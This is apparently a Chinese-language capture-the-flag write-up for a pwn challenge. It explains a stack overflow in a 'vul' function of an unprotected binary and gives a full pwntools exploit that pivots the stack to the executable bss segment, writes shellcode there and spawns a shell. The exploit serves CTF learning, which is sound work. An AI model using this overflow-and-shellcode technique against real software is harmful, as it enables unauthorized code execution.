# maybe a little hard

没开保护， 所以使用可以直接调用所有函数嘻嘻。发现bss段可读可写可执行，vul函数中有溢出漏洞，可以写入大于0x100的数导致栈溢出

![gTvaB4.png](https://z3.ax1x.com/2021/05/20/gTvaB4.png)

~~~
from pwn import *
context(log_level = 'debug', arch = 'amd64')
p = process("./pwn1")

e = ELF("./pwn1")

vul = 0x400691
buf = e.bss()+0x500 # 随便开一个bss段上保证空白的地址就行

log.info('buf' + hex(buf))
shellcode = asm(shellcraft.sh()) # 自动写shellcode，建议大家手动写一下

p.recvuntil('1nter3sting.\n')
payload = b'a'*0x100 + p64(buf+0x100) + p64(vul) 
# rbp被改成了bss端口，返回值修改为vul函数，使得重新开启的栈在bss段，这也是要+0x100的原因，方便之后的shellcode执行

p.send(payload)

payload = shellcode
payload = payload.ljust(0x108, b'\x00') +p64(buf) 
# 在bss段写入shellcode并溢出覆盖rbp 返回值为buf执行shellcode

print(hex(len(payload)))
p.sendline(payload)
p.interactive()
~~~

